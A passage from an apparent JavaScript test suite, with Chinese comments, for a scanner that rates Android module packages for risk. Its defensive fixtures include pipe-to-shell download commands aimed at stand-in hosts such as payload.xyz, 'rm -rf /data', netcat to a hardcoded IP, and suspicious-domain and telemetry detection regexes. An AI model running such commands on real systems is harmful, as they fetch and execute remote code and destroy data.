    ['service.sh', T4_CLEAN_SERVICE], [T4_NAME.descDnd, dnd], [T4_NAME.descMusic, music],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  // 进面这件事可观测（工单 §3 B1：覆盖度/结构清单那一格）
  assert.deepEqual(t4fed(r), [T4_NAME.descDnd, T4_NAME.descMusic].sort());
  assert.deepEqual(t4fedRow(r, T4_NAME.descDnd), {
    name: T4_NAME.descDnd, kind: 'NUL', bytes: 1416, printable: 0.875, scanBytes: 1416, scanCapped: false,
  }, '记账要能自证读的是哪一条、多大、比例多少、实扫多少');
  const md = renderMarkdown(r);
  assert.match(md, /魔数\/NUL 开头但整块可读/);
  assert.ok(md.includes(`| 二进制（已按内容规则逐行扫过） | \`${T4_NAME.descDnd}\``), '清单那一格要换措辞，不许继续说「不逐行扫」');
  // 代价：0 条发现、0 个翻转（工单 §0 那句「阈值不是空样本，但放进来也不出声」）
  assert.deepEqual(t4all(r), [
    `STRUCT_BINARY/medium@${T4_NAME.descDnd}:0`,
    `STRUCT_BINARY/medium@${T4_NAME.descMusic}:0`,
  ], '改前实测就是这两条；改后一条都不许多');
  assert.deepEqual(r.counts, { high: 0, medium: 2, low: 0, info: 0 });
  assert.equal(r.riskLevel, 'medium', '等级一字不变（改前 medium）');
  assert.equal(r.decision.action, 'block', '结论一字不变（改前 block）');
});

test('T4-B2 反面（工单 §3 B2）：真机器码（比例 0.3403）不许进 feed，报告清单与改前逐字一致', async () => {
  const b = t4real('fontSlice');
  assert.equal(b.length, 3000);
  assert.equal(t4ratio(b).toFixed(6), '0.340333', '真机器码离 0.85 有半个身的余量（工单 §0 的反面锚）');
  assert.equal(detectBinary(b.subarray(0, 512)).id, 'NUL');
  const r = await t4pkg('eval.t4b2', T4_NAME.fontSlice, b);
  assert.deepEqual(t4fed(r), [], '阈值把机器码关在面外：这一格就是变异 M2（阈值改 0.3）红第一名的地方');
  assert.deepEqual(t4all(r), [`STRUCT_BINARY/medium@${T4_NAME.fontSlice}:0`], 'findings 与改前逐字一致');
  assert.deepEqual(r.binaries, [{ name: T4_NAME.fontSlice, kind: 'NUL', bytes: 3000 }]);
  assert.deepEqual(r.scripts.map((x) => x.name), ['service.sh', 'module.prop'], '渲染面不许多出一行');
  assert.deepEqual(r.inventory.otherFiles, []);
  assert.deepEqual(r.escalated, []);
  assert.deepEqual(r.counts, { high: 0, medium: 1, low: 0, info: 0 });
  assert.equal(r.riskLevel, 'medium');
  assert.equal(renderMarkdown(r).includes('| 二进制（不逐行扫） |'), true, '没进面的条目继续用原来那一行措辞');
});

test('T4-B3 撤销（工单 §2.5 / §3 B3）：polyglot 进 feed 之后，`sh $MODPATH/assets/payload.bin` 仍然撤不掉', async () => {
  // 载荷 + customize.sh 里那句引用。改前它就是**因引用被升级**进面的（Task 2.7 那条通道），
  // EXEC_BUNDLED_FILE/high 在、revokedBundledRefs=[]、high/block。本轮之后必须**一字不变**：
  // 「它现在在 feed 里」不等于「读过且无罪」（§0.13 那一格不许重开）。
  const zip = makeModuleZip({ id: 'eval.t4b3', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/assets/payload.bin\n'],
    ['assets/payload.bin', T4_SHAPE.a1],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.deepEqual(t4all(r), [
    'EXEC_BUNDLED_FILE/high@customize.sh:2',
    'NETWORK_FETCH/low@assets/payload.bin:2',
    'PIPE_TO_SHELL/high@assets/payload.bin:2',
    'RM_RF_MUTABLE/medium@assets/payload.bin:3',
    'SELINUX_DISABLE/high@assets/payload.bin:4',
    'STRUCT_BINARY/medium@assets/payload.bin:0',
    'VERIFIED_BOOT_SPOOF/high@assets/payload.bin:5',
  ], '撤销语义不许被这一步带歪：证人那条必须在、必须还是 high');
  assert.deepEqual(r.revokedBundledRefs, [], '一笔撤销都没发生 —— 有撤销就说明 covered 判据被喂进 feed 的条目污染了（变异 M3 红在这里）');
  assert.deepEqual(r.escalated, [
    { fromFile: 'customize.sh', fromLine: 2, ref: 'sh $MODPATH/assets/payload.bin', resolvedEntry: 'assets/payload.bin' },
  ], '它本来就是靠引用升级进面的；本轮的新通道不许把它记第二遍，也不许顶掉这笔账');
  assert.deepEqual(r.counts, { high: 4, medium: 2, low: 1, info: 0 });
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
  assert.equal(r.decision.needsHumanReview, true);
  assert.deepEqual(t4fed(r), [], '已在 feed 上的条目不重复记账：polyglot 那一步只补「原本一行都没读」的那几份');
});

// —— §3 不变量 ——

test('T4-C1 不变量（工单 §2.2）：可打印比例全仓只有一份实现，阈值是具名单一常量', () => {
  const shared = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
  const scanSrc = readFileSync(new URL('./scan.mjs', import.meta.url), 'utf8');
  assert.equal((shared.match(/export function printableRatio/g) || []).length, 1, '比例函数只许在共享层导出一次');
  assert.equal((shared.match(/export const POLYGLOT_MIN_PRINTABLE/g) || []).length, 1, '阈值必须是具名单一常量');
  assert.equal(sharedT4.POLYGLOT_MIN_PRINTABLE, 0.85, '阈值就是工单 §0 那一个数');
  assert.equal(typeof sharedT4.printableRatio, 'function', '共享层要拿得出这个函数');
  // 只许有一份实现：scan.mjs 里不许再写第二份字符类，也不许自己导出一个同名函数
  assert.equal(scanSrc.includes('function printableRatio'), false, 'scan.mjs 不许另立一份实现');
  assert.equal(/0x20\s*&&[^;\n]*0x7[eE]/.test(scanSrc), false, 'scan.mjs 里不许出现第二份可打印字符类');
  assert.equal(/0x09[^;\n]*0x0[aA]9?/.test(scanSrc), false, '制表/换行那一截也不许抄第二份');
  assert.equal(scanT4.printableRatio, undefined, '比例函数只在 risk-rules.mjs 导出一次');
  assert.match(scanSrc, /import\s*{[^}]*printableRatio[^}]*}\s*from\s*'\.\/risk-rules\.mjs'/, 'scan.mjs 必须从共享层拿它');
  // 量法逐字对账（夹具侧那份独立复算只用来验这一句）
  for (const key of ['a1', 'a2', 'in851', 'eq850', 'out849', 'big']) {
    assert.equal(sharedT4.printableRatio(T4_SHAPE[key]), t4ratio(T4_SHAPE[key]), `${key} 的两种量法必须同值`);
  }
  assert.equal(sharedT4.printableRatio(Buffer.alloc(0)), 0, '空条目比例记 0（工单 §2.1「内容非空」那一半另有判据）');
});

test('T4-C2 不变量（工单 §2.1）：分桶契约一字未动 —— 没有新桶、coveredSurface 仍是那五个桶', () => {
  const files = readZip(makeModuleZip({ id: 'eval.t4c2', files: [
    ['service.sh', T4_CLEAN_SERVICE], ['assets/payload.bin', T4_SHAPE.a1],
  ]})).files;
  const c = classify(files);
  assert.deepEqual(Object.keys(c).filter((k) => k !== 'propEntry').sort(),
    [...SCAN_TARGET_BUCKETS, 'binaries', 'others'].sort(),
    '本轮不许给 classify() 新增返回键（工单 §2 末条：那是分桶契约，越界即停手）');
  assert.deepEqual(c.binaries.map((f) => f.name), ['assets/payload.bin'], '它仍然落 binaries 桶 —— 进的是 feed，不是文本桶');
  assert.deepEqual(c.otherScripts, []);
  assert.deepEqual(SCAN_TARGET_BUCKETS, ['canonical', 'otherScripts', 'handlers', 'props', 'policy'],
    '可撤销面仍是扩面之前那五个桶，一个都没多');
});

test('T4-C3 不变量（工单 §2.3）：polyglot 走的仍是 24 KB 有界通道，超限照旧记 AUDIT_COVERAGE_TRUNCATED', async () => {
  assert.ok(T4_SHAPE.big.length > CAP29, `夹具必须超上限（${T4_SHAPE.big.length} / ${CAP29}）`);
  assert.equal(T4_SHA1(T4_SHAPE.big), T4_SHA.big, '夹具字节面钉住');
  assert.equal(t4ratio(T4_SHAPE.big).toFixed(6), '0.997474');
  const r = await t4pkg('eval.t4c3', 'assets/big.bin', T4_SHAPE.big);
  assert.ok(!r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE'),
    '上限之后的载荷一行都不许多读（绕过有界通道直接喂全文 = 变异 M4，红在这一格）');
  const cov = r.findings.filter((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED');
  assert.equal(cov.length, 1, JSON.stringify(cov));
  assert.equal(cov[0].file, 'assets/big.bin');
  assert.equal(cov[0].severity, 'medium');
  assert.match(cov[0].message, new RegExp(String(T4_SHAPE.big.length)), '要写原文多少字节');
  assert.match(cov[0].message, new RegExp(String(CAP29)), '要写实扫多少字节');
  assert.deepEqual(t4fed(r), ['assets/big.bin']);
  assert.equal(t4fedRow(r, 'assets/big.bin').scanBytes, CAP29, '记账里的实扫字节必须正好砍在上限上');
  assert.equal(t4fedRow(r, 'assets/big.bin').scanCapped, true);
  assert.notEqual(r.decision.action, 'auto-approve', '「读到一半」永远不等于「干净」');
});

test('T4-C4 不变量（工单 §2.4）：一份身份 —— 条目只在 binaries 清单里出现一次，且纯函数、去重键不变', async () => {
  const r = await t4pkg('eval.t4c4', 'assets/payload.bin', T4_SHAPE.a1);
  assert.equal(r.binaries.filter((b) => b.name === 'assets/payload.bin').length, 1, 'binaries 清单里就一份');
  assert.deepEqual(r.binaries, [{ name: 'assets/payload.bin', kind: 'ELF', bytes: T4_SHAPE.a1.length }],
    'kind / bytes 那份登记一字未动（checkBinaries 没被本轮碰歪）');
  assert.equal(t4listAppearances(r, 'assets/payload.bin'), 0,
    '不许再出现在 otherFiles / scripts / 任何一个文本清单里（工单 §2.4）');
  const keys = r.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`);
  assert.equal(new Set(keys).size, keys.length, '同一去重键不许出现两次（counts 口径不变）');
  // 纯函数：同输入两次同结果（内容、记账、等级都不许带状态）
  const r2 = await t4pkg('eval.t4c4', 'assets/payload.bin', T4_SHAPE.a1);
  assert.deepEqual(t4all(r2), t4all(r));
  assert.deepEqual(r2.polyglotFed, r.polyglotFed);
  assert.deepEqual(r2.counts, r.counts);
  assert.equal(r2.riskLevel, r.riskLevel);
});

// ---------------------------------------------------------------------------
// P10：`SUSPICIOUS_DOMAIN` 的 severity 从「行级命中可疑 TLD」换成**贴着匹配点边界的三条锚点**
//      + 「反向 DNS 包名覆盖」，两条叠加。工单 `briefs/task-p10.md`，历史见 risk-rules.mjs 的注释。
//
// ⚠ 本轮是**放宽方向**（收窄拦截范围）：只往下降级 medium → info，不新增命中、不改三张词表。
//   判据的强度顺序是设计的一部分，不是并列 if：
//     1) 遥测关键词 ⇒ medium（本轮不碰）
//     2) 不命中 SUSPICIOUS_TLD ⇒ null（照旧）
//     3) 强锚点（①scheme 一路连到匹配点 / ②后面紧跟 /path）⇒ medium —— 压过包名豁免
//     4) 反向 DNS 包名（首段 ∈ com|org|net|cn|gov|edu|mil|int）⇒ info —— 压过弱锚点③
//     5) 弱锚点（③整体被引号包住）⇒ medium
//     6) 都不成立 ⇒ info（本轮接受的代价，见 P10-B5 那格真包实物）
//   3→4→5 的先后各有夹具：A3（②压过包名）与 B3（包名压过③），拆掉任一支都有条变红。
// 每条都写**精确 severity**，不写 some(...)（工单 §3）。
// ---------------------------------------------------------------------------

// 真包逐字（只静态读包取原文，没有执行包内任何脚本）
const P10_REAL = {
  configToml95: 'package = "com.tencent.tmgp.cf"',                                    // device_faker config.toml:95
  yuri51: '    remove_path "/storage/emulated/0/Android/data/aidepro.top"',           // Yuri/clear_all_detection_traces.sh:51
  integrityBox591: '  n.style.top="-70px";',                                          // Integrity-Box webroot/Control/index.html:591
  integrityBox514: '      onclick=\'openExternal(${JSON.stringify(item.link || "")})\'', // Integrity-Box webroot/Support/index.html:514
  markedMin716: '          this.lexer.state.top = false;',                           // Integrity-Box webroot/marked.min.js:716
};
const p10sd = (text, file = 'customize.sh') => hits('SUSPICIOUS_DOMAIN', text, file);

test('P10-A1 正面（工单 §3 A1）：①scheme 一路连到匹配点 + ②后面紧跟 /path ⇒ 仍 medium，一条都不许降', () => {
  const h = assertHit('SUSPICIOUS_DOMAIN', 'curl -s https://payload.xyz/drop | sh');
  assert.equal(h.length, 1);
  assert.equal(h[0].severity, 'medium', '真 C2 形状（scheme 连着 + 带路径）是本轮判据的承重墙');
  assert.equal(h[0].snippet, 'payload.xyz', `证据要指名域名本体：${JSON.stringify(h[0])}`);
});

test('P10-A2 正面（工单 §3 A2）：弱锚点③ —— 字符串字面量里的匿名 TLD 域名 ⇒ 仍 medium', () => {
  const h = assertHit('SUSPICIOUS_DOMAIN', 'const H = "api.evil.top"; fetch(H)');
  assert.equal(h.length, 1);
  assert.equal(h[0].severity, 'medium', '整体被引号包住 ⇒ 弱锚点成立（工单 §2 步 5）');
  assert.equal(h[0].snippet, 'api.evil.top');
});

test('P10-A3 正面（工单 §3 A3，最关键的一格）：伪装成反向 DNS 包名的域名后面紧跟 /path ⇒ 仍 medium，包名豁免咬不住', () => {
  // 计划 §0.11 结论四否掉旧谓词时说的正是这个形状：谁都能注册 evil.tk，然后在包里写 com.evil.tk/payload。
  // ⇒ 强锚点②必须**优先于**包名覆盖，否则本轮就是把 §0.11 那条反对理由原样造回去。
  const quoted = assertHit('SUSPICIOUS_DOMAIN', '"com.evil.tk/payload"', 'config.toml');
  assert.equal(quoted.length, 1);
  assert.equal(quoted[0].severity, 'medium', '②（后面紧跟 / + 路径字符）压过包名豁免；这条降成 info 就是白送豁免门');
  assert.equal(quoted[0].snippet, 'com.evil.tk');
  const inLine = assertHit('SUSPICIOUS_DOMAIN', 'PKG = "com.evil.tk/payload"', 'config.toml');
  assert.equal(inLine[0].severity, 'medium');
  assert.equal(inLine[0].snippet, 'com.evil.tk');
});

test('P10-A4 正面（工单 §3 A4）：§0.9 第 576 行点名的两条旧夹具行为一字不变', () => {
  const a = assertHit('SUSPICIOUS_DOMAIN', 'https://x.tk/p', 'customize.sh');
  assert.equal(a.length, 1);
  assert.equal(a[0].severity, 'medium');
  assert.equal(a[0].snippet, 'x.tk');
  // 第二条旧夹具 `1.2.3.4:8080` 本来就不归 SUSPICIOUS_DOMAIN 管（末段不是字母 ⇒ pattern 不成立），
  // 它由 HARDCODED_IP 说话。钉「行为不许变」= 两边都不许被本轮带歪。
  assertNoHit('SUSPICIOUS_DOMAIN', 'nc 1.2.3.4:8080');
  assert.equal(assertHit('HARDCODED_IP', 'nc 1.2.3.4:8080')[0].severity, 'medium');
});

test('P10-A5 正面（工单 §3 A5）：遥测/广告那一支原样，且排在锚点之前 —— 新顺序不许把它带歪', () => {
  const kw = assertHit('SUSPICIOUS_DOMAIN', 'curl https://sdk.umeng.com/collect', 'customize.sh');
  assert.equal(kw[0].severity, 'medium');
  assert.equal(assertHit('SUSPICIOUS_DOMAIN', 'POST https://www.googletagmanager.com/gtm.js')[0].severity, 'medium');
  // 这一条是顺序钉子：**三条锚点都不成立、首段也不是保留字**，只有「关键词先判」才留得住 medium。
  // 若把关键词那一支挪到锚点之后，它会掉到 info（本轮没动它，也没有它的误报证据）。
  const bare = assertHit('SUSPICIOUS_DOMAIN', 'ads=doubleclick.net', 'module.prop');
  assert.equal(bare.length, 1);
  assert.equal(bare[0].severity, 'medium', '遥测关键词支不参与本轮收窄：它必须在锚点与包名之前判');
});

test('P10-A6 正面（工单 §3 A6 / B4）：io.github.foo.ml ⇒ 留在 medium（已知残留 FP，不是本轮要闭的对象）', () => {
  // `io` 不在那八个反向 DNS 保留字里 —— 它**本身就是一个可疑 TLD**，收进来等于送出一条
  // 「投稿者把包名换成 io. 前缀就能造形状」的豁免门（工单 §2 步 4）。代价如实写着：
  // 反向 DNS 形状的 `io.github.foo.ml` 在引号里 ⇒ 弱锚点③成立 ⇒ 仍是 medium，这条 FP 本轮不修。
  // §0.9 第 576 行当年要求它「不再是 medium」，那是被 §0.11 结论四否掉的那版谓词口径，本轮不照它做。
  const h = assertHit('SUSPICIOUS_DOMAIN', 'const PKG = "io.github.foo.ml";', 'service.js');
  assert.equal(h.length, 1);
  assert.equal(h[0].severity, 'medium', '已知残留 FP：io 不是保留字，弱锚点③把它留在 medium（工单 §3 A6/B4）');
  assert.equal(h[0].snippet, 'io.github.foo.ml');
});

test('P10-A7 正面（主控复验 MB-M2 时补的一格）：锚点①必须能**单独**成立 —— scheme 紧邻、后面没有路径', () => {
  // 复验「只摘②」那一发时 A1/A4 一起红，说明 A1 那两条一直是②在咬，①一次都没生效过。
  // 根因是 anchorSchemeConnects 的切片右界：碰到 `://` 时 slice(..., q-2) 永远停在冒号**之前**，
  // 于是 /https?:$/ 恒假 ⇒ 那一支是死码。死掉的正好是真 C2 最常见的一种写法：
  // 下载器 + scheme + 裸域名（后面不跟路径）。它从 medium 掉到 info，比线上改前的行级判据还松，
  // 那是 fail-open，不是省误伤。
  const viaScheme = assertHit('SUSPICIOUS_DOMAIN', 'curl https://payload.xyz | sh', 'service.sh');
  assert.equal(viaScheme.length, 1);
  assert.equal(viaScheme[0].severity, 'medium', '①单独成立就必须留 medium：这一行紧跟的是空格，②不成立');
  assert.equal(viaScheme[0].snippet, 'payload.xyz');
  const http = assertHit('SUSPICIOUS_DOMAIN', 'ping http://evil.top', 'service.sh');
  assert.equal(http[0].severity, 'medium', 'http:// + 行尾（②③都不成立）⇒ 这一条只能由①留下');
  // 反向钉子：scheme 与域名之间隔一个空白就不算「一路连到匹配点」，①不许跨过空白去咬（工单 §2 步 3）。
  const gap = assertHit('SUSPICIOUS_DOMAIN', 'get https:// payload.xyz', 'service.sh');
  assert.equal(gap[0].severity, 'info', '中间有空白 ⇒ ①必须否；这一格若不否，①就变成整行的邻域窗口了');
});

test('P10-B1 反面（工单 §3 B1）：DOM/CSS 属性访问 t.style.top / n.style.top（HTML 与 JS 各一份）⇒ info 且证据仍在', () => {
  const html = p10sd(P10_REAL.integrityBox591, 'webroot/Control/index.html');
  assert.equal(html.length, 1, '降的是 severity，不是删证据 —— finding 必须仍然出现在报告面上');
  assert.equal(html[0].severity, 'info', `逐字真包行必须降成 info：${JSON.stringify(html[0])}`);
  assert.equal(html[0].snippet, 'n.style.top');
  const js = p10sd('  var h = t.style.top;', 'webroot/assets/app.js');
  assert.equal(js.length, 1);
  assert.equal(js[0].severity, 'info');
  assert.equal(js[0].snippet, 't.style.top');
  // 同一族的两个真包形状（工单 §0.11 结论三点名的 `item.link` / `state.top`）
  assert.equal(p10sd(P10_REAL.integrityBox514, 'webroot/Support/index.html')[0].severity, 'info');
  assert.equal(p10sd(P10_REAL.markedMin716, 'webroot/marked.min.js')[0].severity, 'info');
});

test('P10-B2 反面（工单 §3 B2）：window.innerHeight-e.top（算术里的属性读）⇒ info', () => {
  const h = p10sd('  max = window.innerHeight-e.top;', 'webroot/assets/app.js');
  assert.equal(h.length, 1);
  assert.equal(h[0].severity, 'info');
  assert.equal(h[0].snippet, 'window.innerHeight-e.top');
});

test('P10-B3 反面（工单 §3 B3）：反向 DNS 包名 ⇒ info —— 且必须**优先于弱锚点③**，真包那条逐字', () => {
  const bare = p10sd('com.tencent.tmgl.cf', 'module.prop');
  assert.equal(bare.length, 1);
  assert.equal(bare[0].severity, 'info');
  // 承重的那一格：这一行**整体在引号里**，弱锚点③本来成立。包名覆盖若不优先于③，
  // device_faker 只到 5/6，§2.6 那句「两条叠加才盖得住 6/6」就落不了地（变异 M3 摘掉包名覆盖必红在这里）。
  const real = p10sd(P10_REAL.configToml95, 'config.toml');
  assert.equal(real.length, 1);
  assert.equal(real[0].severity, 'info', `真包 config.toml:95 必须降成 info：${JSON.stringify(real[0])}`);
  assert.equal(real[0].snippet, 'com.tencent.tmgp.cf');
  assert.match(real[0].advice, /反向 DNS 包名形状/, '降级的理由必须让人看得见（工单 §2 步 4：message/why 里写明）');
});

test('P10-B5 反面（工单 §3 B5，本轮接受的代价）：Yuri/clear_all_detection_traces.sh:51 的 aidepro.top 会被降成 info', () => {
  // ⚠ 这条**不是误报修复**，是实物税：那是「清理痕迹」脚本里的一个外部域名，本轮判据里没有锚点，
  // 于是掉进「无取用上下文 ⇒ info」。用户 2026-10-14 拍口径时认下这条代价（计划 §2.6 第三批）。
  // 把它钉在反面，是为了让它被看见而不是被忘掉：任何把 info 再往下删、或反过来把它抬回 medium 的改动，都得先解释这一格。
  const h = p10sd(P10_REAL.yuri51, 'Yuri/clear_all_detection_traces.sh');
  assert.equal(h.length, 1, '税也必须是看得见的证据，不许从报告里消失');
  assert.equal(h[0].severity, 'info', '本轮接受的代价逐字钉死：真该被看见的域名，因为没有锚点而降级');
  assert.equal(h[0].snippet, 'aidepro.top');
  assert.equal(countsTowardRisk(h[0]), false, 'info 不抬等级（工单 §2 硬约束 1）');
});

test('P10-C1 不变量（工单 §3）：基数一行一条、snippet 指名产生结论的匹配、maxPerFile、纯函数照旧', () => {
  // 一行里既有降级候选又有真锚点 ⇒ 取**最大档**（收窄不许把整行拖松，也不许多出一条）
  const mixed = p10sd('var p = "com.evil.tk/payload"; t.style.top = n.style.top;', 'webroot/assets/app.min.js');
  assert.equal(mixed.length, 1, '一条规则一行最多一条（fix3-P7 契约 1）');
  assert.equal(mixed[0].severity, 'medium', '非豁免匹配里的最大档（契约 3）：降级的一支不许带走 medium');
  assert.equal(mixed[0].snippet, 'com.evil.tk', 'snippet 取产生结论的那个匹配，不是最左的（契约 4）');
  // 全行都是降级候选 ⇒ 收敛成一条 info，仍然在报告面上
  const allInfo = p10sd('t.style.top = 1; n.style.top = 2; e.link = 3;', 'webroot/assets/app.min.js');
  assert.equal(allInfo.length, 1);
  assert.equal(allInfo[0].severity, 'info');
  // maxPerFile 仍是每文件每规则 20 条，且按**行**计
  const many = Array.from({ length: 30 }, (_, i) => `  x${i}.style.top = ${i};`).join('\n');
  assert.equal(p10sd(many, 'webroot/assets/app.min.js').length, 20, 'maxPerFile 语义不许被本轮碰歪');
  // 纯函数：同输入两次同结果（判据不许带状态）
  const t = 'const PKG = "com.foo.cf"; var y = e.top;\nhttps://a.tk/p';
  assert.deepEqual(p10sd(t, 'webroot/app.js'), p10sd(t, 'webroot/app.js'));
  // anchor 声明与闭包表口径不变
  assert.equal(RULES_BY_ID.SUSPICIOUS_DOMAIN.anchor, 'anywhere');
});

test('P10-C2 钉子（工单 §3 末段）：三张词表逐字未动，且判据全仓只有一份实现', () => {
  const src = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
  const TLD_LINE = 'const SUSPICIOUS_TLD = /\\.(?:xyz|top|tk|ml|ga|cf|gq|pw|cc|icu|rest|cyou|buzz|click|link|monster|su|live|lol)\\b/i;';
  const KW_LINE = 'const SUSPICIOUS_KEYWORD = /(?:telemetry|tracker|tracking|analytics|adservice|ads?\\.(?:com|net)|doubleclick|googlesyndication|googletagmanager|umeng|talkingdata|appsflyer|adjust\\.com|branch\\.io|sentry\\.io|mixpanel|amplitude|bugly|jiagu|igexin)/i;';
  const EX_LINE = '  exclude: /^\\s*#|localhost|android\\.com|github\\.com|githubusercontent\\.com|magisk|kernelsu|kernelsu\\.org|topjohnwu|google\\.com|googleapis\\.com|gstatic\\.com|w3\\.org|schema\\.org|json\\.org|example\\.com/,';
  assert.ok(src.includes(TLD_LINE), 'SUSPICIOUS_TLD 词表必须逐字未动（本轮是收窄 severity，不是改词表）');
  assert.ok(src.includes(KW_LINE), 'SUSPICIOUS_KEYWORD 词表必须逐字未动');
  assert.ok(src.includes(EX_LINE), 'exclude 白名单必须逐字未动');
  // 表长度对账：从上面那三行逐字文本里数，19 / 20 / 16
  assert.equal(TLD_LINE.match(/\(\?:([^)]*)\)/)[1].split('|').length, 19, '可疑 TLD 表 19 项');
  assert.equal(KW_LINE.split('|').length, 21, '遥测关键词表 20 项（其中一支是嵌套 (?:com|net)，所以切出 21 段）');
  assert.equal(EX_LINE.match(/\|/g).length + 1, 16, 'exclude 白名单 16 项');
  // pattern 逐字未动（severityFor 的输入形状因此还是那个 host）
  assert.equal(RULES_BY_ID.SUSPICIOUS_DOMAIN.pattern.source, '\\b(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+[a-z]{2,24}\\b');
  assert.equal(RULES_BY_ID.SUSPICIOUS_DOMAIN.pattern.flags, 'i');
  // 反向 DNS 保留字表：就这八个，一个都不许多（io/dev/me/xyz 本身是可疑 TLD，收进来就是投稿者可造的豁免门）
  const reservedLine = (src.split(/\r?\n/).find((l) => l.startsWith('const REVERSE_DNS_RESERVED_LABEL')) || '').replace(/ \/\/.*$/, '');
  assert.equal(reservedLine, 'const REVERSE_DNS_RESERVED_LABEL = /^(?:com|org|net|cn|gov|edu|mil|int)$/i;',
    '保留字表必须是具名单一常量、逐字这八个（工单 §2 步 4：判据只许有一份实现）');
  assert.deepEqual(reservedLine.slice(reservedLine.indexOf('(?:') + 3, reservedLine.indexOf(')$/')).split('|'),
    ['com', 'org', 'net', 'cn', 'gov', 'edu', 'mil', 'int'], '保留字表就是八个');
  // 单一实现点：不许有第二条 SUSPICIOUS_DOMAIN_* 规则，也不许在 scan.mjs 里后处理（fix6-F1 的病）
  const sdRules = CONTENT_RULES.filter((r) => /^SUSPICIOUS_DOMAIN/.test(r.id));
  assert.equal(sdRules.length, 1, `SUSPICIOUS_DOMAIN 族只许一条规则：${sdRules.map((r) => r.id).join(',')}`);
  const scanSrc = readFileSync(new URL('./scan.mjs', import.meta.url), 'utf8');
  assert.ok(!/SUSPICIOUS_DOMAIN/.test(scanSrc), 'scan.mjs 不许对这条规则做 severity 后处理 —— 判据住在 severityFor 里');
});

test('P10-C3 整包（工单 §2 硬约束 1）：降的是 severity，不是删证据，等级也不许被降级带松', async () => {
  const zip = makeModuleZip({ id: 'eval.p10c3', files: [
    ['module.prop', moduleProp('eval.p10c3')],
    ['customize.sh', '#!/system/bin/sh\nrm -rf /data\n'],
    ['webroot/Control/index.html', `${P10_REAL.integrityBox591}\n`],
    ['webroot/assets/app.js', '  var h = t.style.top;\n  max = window.innerHeight-e.top;\n'],
    ['config.toml', `${P10_REAL.configToml95}\n`],
    ['Yuri/clear_all_detection_traces.sh', `${P10_REAL.yuri51}\n`],
  ] });
  const r = await scanToReport(zip, { changeType: 'first' });
  const sd = r.findings.filter((f) => f.ruleId === 'SUSPICIOUS_DOMAIN');
  assert.equal(sd.length, 5, '报告面上 5 条一条都不许多/少（降级只改 severity）');
  assert.deepEqual(sd.map((f) => f.severity), ['info', 'info', 'info', 'info', 'info'], '五格全降 ⇒ 但都在 findings 里');
  assert.equal(countsTowardRisk(sd[0]), false);
  assert.equal(r.counts.info, sd.length, '它们落进 counts.info，不落进 medium');
  assert.equal(r.counts.medium, 0, '降级不许凭空造出 medium，也不许把 info 记成 low');
  assert.equal(r.riskLevel, 'high', '整包等级由别的规则说话：info 再多也不抬，别的命中也不许因为降级而消失');
  assert.equal(r.decision.action, 'block');
  const keys = r.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`);
  assert.equal(new Set(keys).size, keys.length, 'counts 去重键口径不变');
});

// ===========================================================================
// A1 —— 自带官方 `update-binary` 的模块：标准安装器那一行按「限定路径 + 逐字相符」降级为 info
// ===========================================================================
// 工单 briefs/task-a1.md。这条**是用户拍的**（计划 §2.6 第三批，2026-10-14），主控当时推荐的是
// 不豁免，并且一度把这条记反成「不豁免」，2026-10-15 对着会话原文核对后订正 —— 所以这一格是
// 实现活，不是文档活。两侧夹具都要写：正面钉「豁免真的生效」，反面钉「豁免窄到什么程度」。
//
// 主控派活前量好的两条边界（本段各自复现一次，不复现就不算数）：
//   * 逐字模板行落在条目 `META-INF/com/google/android/update-binary` 上**只**触发 EXEC_BUNDLED_FILE/high；
//   * 同一行把 `$MODPATH` 换成 `$MD` 触发的是 **EXEC_INDIRECT/high** —— 另一条规则，本轮一个字没碰。
// ⇒ 豁免面天然只有这一条规则、这一个路径、这一行逐字形状：「换个写法就照报」不是额外要求，
//   是这两条规则本来就不重叠（A1-N5 把这条钉成夹具）。
//
// 语义两条，各管各的，一条都不许顺手并掉（工单 §2）：
//   降级：finding 仍在 report.findings，severity 降到 info，advice 说清为什么（不许 null 删证据、
//         不许 low —— low 参与定级，info 不参与，A1-C1 钉这两者不等价）；
//   记账：被这一行 source 的 `customize.sh` **照样进扫描面**。引用解析跑的是原始 pattern，
//         不看这条豁免 —— A1-N6 用两发整包用例把它钉成可证伪的断言，变异 M5 必须红在那里。

const A1_UB = 'META-INF/com/google/android/update-binary';
const A1_TPL = '[ -f $MODPATH/customize.sh ] && . $MODPATH/customize.sh';

test('A1-01 正面：模板逐字行 @ 官方 update-binary 条目 ⇒ 1 条 finding、severity info、advice 写明逐字相符', () => {
  const h = hits('EXEC_BUNDLED_FILE', A1_TPL, A1_UB);
  assert.equal(h.length, 1, `降级不删证据：命中必须还在报告面上，且一行只有一条：${JSON.stringify(h)}`);
  assert.equal(h[0].ruleId, 'EXEC_BUNDLED_FILE');
  assert.equal(h[0].severity, 'info', `限定路径 + 整行逐字 ⇒ 降severity：${JSON.stringify(h[0])}`);
  assert.equal(countsTowardRisk(h[0]), false, 'info 不参与定级（这是这条豁免唯一的代价来源）');
  assert.match(h[0].advice, /逐字相符/, '理由要写在报告面上，不许由「没命中」反推');
  // 证据本体一个字不许改：snippet 还是那个匹配，file/line 还是那一行
  assert.equal(h[0].snippet, '. $MODPATH/customize.sh', JSON.stringify(h[0]));
  assert.equal(h[0].file, A1_UB);
  assert.equal(h[0].line, 1);
  // 规则自己的默认档不许被这条豁免带走（撤销、引用解析、脱敏都还按 high 那条规则说话）
  assert.equal(EXEC_BUNDLED_FILE.severity, 'high', '规则声明的默认 severity 仍是 high：降的是这一条 finding');
});

test('A1-02 正面：同一行的 CRLF / 尾随空白版本 ⇒ 仍 info（行尾差异不是形状差异，不为此交人工税）', () => {
  // 真包里的 update-binary 常常整篇 CRLF（Windows 上编辑过的模板）。
  // 比对前只许做两件事：行尾 `\r` 归一 + 整行 trim —— 这两格就是那两件事的边界。
  const crlfFile = '#!/system/bin/sh\r\n' + A1_TPL + '\r\n';
